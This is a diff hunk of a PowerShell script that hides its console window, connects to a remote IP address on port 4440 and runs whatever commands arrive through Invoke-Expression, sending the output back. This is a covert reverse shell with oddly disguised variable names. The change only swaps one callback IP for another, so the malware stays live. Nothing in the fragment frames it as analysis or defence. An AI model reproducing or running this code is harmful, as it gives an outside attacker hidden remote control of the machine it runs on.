@@ -7,7 +7,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 }
 Hide-Console
-$client = New-Object System.Net.Sockets.TCPClient("77.86.23.181",4440)
+$client = New-Object System.Net.Sockets.TCPClient("13.51.72.47",4440)
 $river = $client.GetStream();[byte[]]$teeth = 0..65535|%{0}
 while(($i = $river.Read($teeth, 0, $teeth.Length)) -ne 0){;$info = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($teeth,0, $i)
 $return = (iex $info 2>&1 | Out-String )
